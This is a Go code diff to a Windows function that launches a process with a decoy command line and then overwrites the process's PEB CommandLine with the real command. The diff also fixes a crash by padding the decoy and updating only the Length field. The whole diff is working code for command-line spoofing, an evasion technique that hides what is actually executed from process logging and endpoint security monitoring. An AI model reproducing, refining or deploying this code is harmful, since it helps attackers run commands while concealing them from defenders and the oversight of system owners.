@@ -83,6 +83,14 @@ func executeSpoofedProcess(realCmd, spoofCmd string) (string, error) {
 		spoofCmd = realExe + " " + spoofCmd
 	}
 
+	// Pad spoof command to be at least as long as the real command.
+	// This ensures the real command fits in the existing PEB buffer without
+	// needing to allocate new memory or change the Buffer pointer, which
+	// can cause STATUS_DLL_INIT_FAILED during process initialization.
+	if len(spoofCmd) < len(realCmd) {
+		spoofCmd = spoofCmd + strings.Repeat(" ", len(realCmd)-len(spoofCmd))
+	}
+
 	// Create pipe for stdout/stderr capture
 	var stdoutRead, stdoutWrite windows.Handle
 	var sa windows.SecurityAttributes
@@ -172,7 +180,6 @@ func executeSpoofedProcess(realCmd, spoofCmd string) (string, error) {
 		return "", fmt.Errorf("read CommandLine UNICODE_STRING: %v", err)
 	}
 
-	origMaxLen := binary.LittleEndian.Uint16(cmdLineUS[2:4])
 	origBuffer := *(*uintptr)(unsafe.Pointer(&cmdLineUS[8]))
 
 	// Step 5: Encode real command as UTF-16LE
@@ -186,26 +193,9 @@ func executeSpoofedProcess(realCmd, spoofCmd string) (string, error) {
 	realLenBytes := uint16((len(realUTF16) - 1) * 2)
 	realMaxBytes := uint16(len(realUTF16) * 2)
 
-	// Step 6: Write real command to process memory
-	var writeAddr uintptr
-	if realMaxBytes <= origMaxLen {
-		// Real command fits in existing buffer
-		writeAddr = origBuffer
-	} else {
-		// Allocate new buffer in target process
-		newBuf, _, allocErr := procVirtualAllocEx.Call(
-			uintptr(pi.Process), 0,
-			uintptr(realMaxBytes),
-			uintptr(MEM_COMMIT|MEM_RESERVE),
-			uintptr(windows.PAGE_READWRITE),
-		)
-		if newBuf == 0 {
-			windows.TerminateProcess(pi.Process, 1)
-			windows.CloseHandle(stdoutWrite)
-			return "", fmt.Errorf("VirtualAllocEx for command line: %v", allocErr)
-		}
-		writeAddr = newBuf
-	}
+	// Step 6: Write real command into the existing PEB buffer
+	// The spoof was padded to be >= real command, so it always fits
+	writeAddr := origBuffer
 
 	// Write the UTF-16 encoded real command
 	realBytes := make([]byte, realMaxBytes)
@@ -220,19 +210,15 @@ func executeSpoofedProcess(realCmd, spoofCmd string) (string, error) {
 		return "", fmt.Errorf("write real command: %v", err)
 	}
 
-	// Step 7: Update UNICODE_STRING in ProcessParameters
-	// Write Length, MaximumLength, and Buffer pointer
-	var newUS [16]byte
-	binary.LittleEndian.PutUint16(newUS[0:2], realLenBytes)
-	binary.LittleEndian.PutUint16(newUS[2:4], realMaxBytes)
-	// Padding at [4:8] is zeroed
-	*(*uintptr)(unsafe.Pointer(&newUS[8])) = writeAddr
-
-	err = windows.WriteProcessMemory(pi.Process, cmdLineAddr, &newUS[0], 16, &bytesWritten)
+	// Step 7: Update CommandLine.Length in ProcessParameters
+	// Only update Length (first 2 bytes) — MaximumLength and Buffer stay the same
+	var lenBytes [2]byte
+	binary.LittleEndian.PutUint16(lenBytes[:], realLenBytes)
+	err = windows.WriteProcessMemory(pi.Process, cmdLineAddr, &lenBytes[0], 2, &bytesWritten)
 	if err != nil {
 		windows.TerminateProcess(pi.Process, 1)
 		windows.CloseHandle(stdoutWrite)
-		return "", fmt.Errorf("update CommandLine UNICODE_STRING: %v", err)
+		return "", fmt.Errorf("update CommandLine.Length: %v", err)
 	}
 
 	// Step 8: Resume the process
